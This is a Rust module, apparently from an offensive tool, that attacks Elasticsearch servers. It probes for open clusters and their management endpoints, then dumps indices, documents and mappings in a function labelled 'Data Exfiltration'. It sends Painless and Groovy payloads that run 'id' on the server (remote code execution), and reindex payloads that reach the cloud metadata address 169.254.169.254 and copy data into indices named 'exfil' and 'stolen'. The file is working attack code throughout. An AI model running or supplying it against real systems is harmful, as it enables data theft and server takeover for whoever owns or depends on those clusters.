use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn expose(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Elasticsearch Exposure Detection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 && (body.contains("cluster_name") || body.contains("elasticsearch")) {
        println!(
            "  {} Open Elasticsearch instance found!",
            "[!]".red().bold()
        );
        println!("  {} Cluster info:", "[*]".cyan().bold());
        for line in body.lines().take(10) {
            println!("    {}", line);
        }
    } else {
        println!(
            "  {} Elasticsearch not exposed or requires auth.",
            "[-]".green().bold()
        );
    }

    let endpoints = [
        "/_cat/health",
        "/_cat/indices",
        "/_cat/nodes",
        "/_cat/shards",
        "/_cluster/health",
        "/_cluster/settings",
        "/_nodes",
        "/_all/_settings",
    ];
    println!("\n  {} Checking management endpoints:", "[*]".cyan().bold());
    for ep in &endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client.get(&target).send().await {
            Ok(r) => {
                let s = r.status().as_u16();
                let t = r.text().await.unwrap_or_default();
                if s == 200 && !t.is_empty() {
                    println!("    {} {:25} — {} bytes", "[+]".green().bold(), ep, t.len());
                } else {
                    println!("    {} {:25} — status={}", "[-]".dimmed(), ep, s);
                }
            }
            Err(_) => println!("    {} {:25} — error", "[-]".dimmed(), ep),
        }
    }

    Ok(())
}

pub async fn dump(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Elasticsearch Data Exfiltration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let indices_url = format!("{}/_cat/indices?format=json", url.trim_end_matches('/'));
    let resp = client.get(&indices_url).send().await?;
    let text = resp.text().await.unwrap_or_default();

    println!("  {} Indices:", "[*]".cyan().bold());
    for line in text.lines().take(20) {
        println!("    {}", line);
    }

    let all_url = format!("{}/_all/_search?size=100", url.trim_end_matches('/'));
    let resp = client.get(&all_url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 {
        println!("\n  {} Document search (first 100):", "[+]".green().bold());
        for line in body.lines().take(30) {
            println!("    {}", line);
        }
    } else {
        println!("  {} Search failed (status={})", "[-]".dimmed(), status);
    }

    let mappings_url = format!("{}/_all/_mapping", url.trim_end_matches('/'));
    if let Ok(r) = client.get(&mappings_url).send().await {
        let mt = r.text().await.unwrap_or_default();
        if !mt.is_empty() {
            println!("\n  {} Index mappings:", "[*]".cyan().bold());
            for line in mt.lines().take(15) {
                println!("    {}", line);
            }
        }
    }

    Ok(())
}

pub async fn script(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Elasticsearch Script Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        (
            "Painless hello",
            r#"{"query":{"match_all":{}},"script_fields":{"test":{"script":{"source":"1+1"}}}}"#,
        ),
        (
            "Painless RCE",
            r#"{"query":{"match_all":{}},"script_fields":{"exec":{"script":{"source":"Runtime.getRuntime().exec('id')"}}}}"#,
        ),
        (
            "Groovy RCE",
            r#"{"query":{"match_all":{}},"script_fields":{"exec":{"script":{"lang":"groovy","source":"'id'.execute().text"}}}}"#,
        ),
        ("Search template", r#"{"id":"_search","params":{}}"#),
        (
            "Stored script",
            r#"{"script":{"lang":"painless","source":"doc['field'].value*2"}}"#,
        ),
    ];

    for (name, payload) in &payloads {
        let target = format!("{}/_search", url.trim_end_matches('/'));
        match client
            .post(&target)
            .header("Content-Type", "application/json")
            .body(*payload)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                let success = status == 200 && !text.contains("error");
                let tag = if success {
                    "SCRIPT EXECUTED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:25} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn reindex(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Elasticsearch Reindex Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        (
            "SSRF via reindex",
            r#"{"source":{"remote":{"host":"http://169.254.169.254:80"},"index":"*"},"dest":{"index":"exfil"}}"#,
        ),
        (
            "Data manipulation",
            r#"{"source":{"index":"sensitive"},"dest":{"index":"stolen"}}"#,
        ),
        (
            "Pipeline injection",
            r#"{"source":{"index":"logs"},"dest":{"index":"modified"},"pipeline":"inject_script"}}"#,
        ),
        (
            "Remote reindex",
            r#"{"source":{"remote":{"host":"http://internal-elasticsearch:9200"},"index":"*"},"dest":{"index":"bridge"}}"#,
        ),
    ];

    for (name, payload) in &payloads {
        let target = format!("{}/_reindex", url.trim_end_matches('/'));
        match client
            .post(&target)
            .header("Content-Type", "application/json")
            .body(*payload)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                let success = status == 200 && !text.contains("error");
                let tag = if success {
                    "REINDEX SUCCESS".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:25} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
